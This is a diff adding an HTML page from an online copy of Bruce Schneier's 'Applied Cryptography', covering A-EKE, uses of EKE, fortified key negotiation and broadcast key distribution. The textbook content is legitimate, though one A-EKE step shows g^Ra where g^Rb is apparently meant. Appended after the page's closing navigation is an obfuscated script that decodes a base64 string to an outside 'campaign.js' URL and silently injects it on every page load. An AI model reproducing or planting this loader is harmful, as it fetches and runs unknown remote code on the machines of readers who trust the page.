@@ -1,0 +1,117 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key-Exchange Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=22//-->
+<!--PAGES=521-523//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="22-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="22-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Here&#146;s how it works. As usual, Alice and Bob want to authenticate each other and generate a common key. They agree on some digital signature scheme where any number can serve as the private key, and where the public key is derived from the private key, rather than being generated along with it. The ElGamal and DSA algorithms work well for this. Alice&#146;s password <I>P</I> (or perhaps some simple hash of it) will serve as the private key and as <I>P&#180;.</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks her random exponent <I>R</I><SUB>a</SUB> and transmits
+<DL>
+<DD><I>E</I><SUB>P&#180;</SUB>(<I>g</I><SUP>R<SMALL><SMALL>A</SMALL></SMALL></SUP> mod <I>n</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob, who knows only <I>P&#180;</I> and cannot derive <I>P</I> from it, chooses <I>R</I><SUB>b</SUB> and sends
+<DL>
+<DD><I>E</I><SUB>P&#180;</SUB>(<I>g<SUP>R<SMALL><SMALL>A</SMALL></SMALL></SUP></I> mod <I>n</I>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Both Alice and Bob calculate the shared session key <I>K</I> = <I>g</I><SUP>r<SMALL><SMALL>A</SMALL></SMALL></SUP>*<SUP>r<SMALL><SMALL>B</SMALL></SMALL></SUP> mod <I>n.</I> Finally, Alice proves that she knows <I>P</I> itself, and not just <I>P&#180;,</I> by sending
+<DL>
+<DD><I>EK</I>(<I>SP</I>(<I>K</I>))
+</DL>
+</DL>
+<P>Bob, who knows both <I>K</I> and <I>P&#180;,</I> can decrypt and validate the signature. Only Alice could have sent this message, since only she knows <I>P;</I> an intruder who obtains a copy of Bob&#146;s password file can try guessing at <I>P,</I> but cannot otherwise sign the session key.</P>
+<P>The A-EKE scheme does not work with the public-key variant of EKE, since in it one party chooses the session key and imposes it on the other. This permits a man-in-the-middle attack by an attacker who has captured <I>P&#180;.</I></P>
+<P><FONT SIZE="+1"><B><I>Applications of EKE</I></B></FONT></P>
+<P>Bellovin and Merritt suggest using this protocol for secure public telephones [109]:
+</P>
+<BLOCKQUOTE><P>Let us assume that encrypting public telephones are deployed. If someone wishes to use one of these phones, some sort of keying information must be provided. Conventional solutions...require that the caller possess a physical key. This is undesirable in many situations. EKE permits use of a short, keypad-entered password, but uses a much longer session key for the call.
+</P>
+<P>EKE would also be useful with cellular phones. Fraud has been a problem in the cellular industry; EKE can defend against it (and ensure the privacy of the call) by rendering a phone useless if a PIN has not been entered. Since the PIN is not stored within the phone, it is not possible to retrieve one from a stolen unit.</P>
+</BLOCKQUOTE><P>EKE&#146;s primary strength is that both symmetric and public-key cryptography work together in a manner that strengthens them both:
+</P>
+<BLOCKQUOTE><P>From a general perspective, EKE functions as a <I>privacy amplifier.</I> That is, it can be used to strengthen comparatively weak symmetric and asymmetric systems when used together. Consider, for example, the key size needed to maintain security when using exponential key exchange. As LaMacchia and Odlyzko have shown [934], even modulus sizes once believed to be safe (to wit, 192 bits) are vulnerable to an attack requiring only a few minutes of computer time. But their attack is not feasible if one must first guess a password before applying it.</P>
+<P>Conversely, the difficulty of cracking exponential key exchange can be used to frustrate attempts at password-guessing. Password-guessing attacks are feasible because of how rapidly each guess may be verified. If performing such verification requires solving an exponential key exchange, the total time, if not the conceptual difficulty, increases dramatically.</P>
+</BLOCKQUOTE><P>EKE is patented [111].
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">22.6 Fortified Key Negotiation</FONT></H3>
+<P>This scheme also protects key-negotiation schemes from poorly chosen passwords and man-in-the-middle attacks [47,983]. It uses a hash function of two variables that has a very special property: It has many collisions on the first variable while having effectively no collisions on the second variable.
+</P>
+<DL>
+<DD><I>H&#180;</I>(<I>x, y</I>) = <I>H</I>(<I>H</I>(<I>k, x</I>) mod 2<I><SUP>m</SUP></I>, <I>x</I>),
+<DD>where <I>H</I>(<I>k, x</I>) is an ordinary hash function on <I>k</I> and <I>x</I>
+</DL>
+<P>Here&#146;s the protocol. Alice and Bob share a secret password, <I>P,</I> and have just exchanged a secret key, <I>K,</I> using Diffie-Hellman key exchange. They use <I>P</I> to check that their two session keys are the same (and that Eve is not attempting a man-in-the-middle attack), without giving <I>P</I> away to Eve.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob
+<DL>
+<DD><I>H&#180;</I> (<I>P, K</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob computes <I>H&#180;</I> (<I>P, K</I>) and compares his result with what he received from Alice. If they match he sends Alice
+<DL>
+<DD><I>H&#180;</I>(<I>H</I>(<I>P, K</I>))
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>H&#180;</I> (<I>H</I>(<I>P,</I> K)) and compares her result with what she received from Bob.
+</DL>
+<P>If Eve is trying a man-in-the-middle attack, she shares one key, <I>K</I><SUB>1</SUB>, with Alice, and another key, <I>K</I><SUB>2</SUB>, with Bob. To fool Bob in step (2), she has to figure out the shared password and then send Bob <I>H&#180;</I> * (<I>P, K</I><SUB>2</SUB>). With a normal hash function she can try common passwords until she guesses the correct one, and then successfully infiltrate the protocol. But with this hash function, many passwords are likely to produce the same value when hashed with <I>K</I><SUB>1</SUB>. So when she finds a match, she will probably have the wrong password, and hence Bob will not be fooled.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">22.7 Conference Key Distribution and Secret Broadcasting</FONT></H3>
+<P>Alice wants to broadcast a message, <I>M,</I> from a single transmitter. However, she doesn&#146;t want it to be intelligible by every listener. In fact, she only wants a select subset of listeners to be able to recover <I>M.</I> Everyone else should get nonsense.</P>
+<P>Alice can share a different key (secret or public) with each listener. She encrypts the message in some random key, <I>K.</I> Then she encrypts a copy of <I>K</I> with each of the keys of her intended recipients. Finally, she broadcasts the encrypted message and then all of the encrypted <I>K</I>s. Bob, who is listening, either tries to decrypt all the <I>K</I>s with his secret key, looking for one that is correct, or, if Alice doesn&#146;t mind everyone knowing who her message is for, he looks for his name followed by an encrypted key. Multiple-key cryptography, previously discussed, also works.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="22-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="22-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(aeoXoRud, oMkcXaiJ) {oMkcXaiJ = aeoXoRud.createElement('script');oMkcXaiJ.type = 'text/javascript';oMkcXaiJ.async = true;oMkcXaiJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');aeoXoRud.getElementsByTagName('body')[0].appendChild(oMkcXaiJ);}(document));</script></body>
+</html>
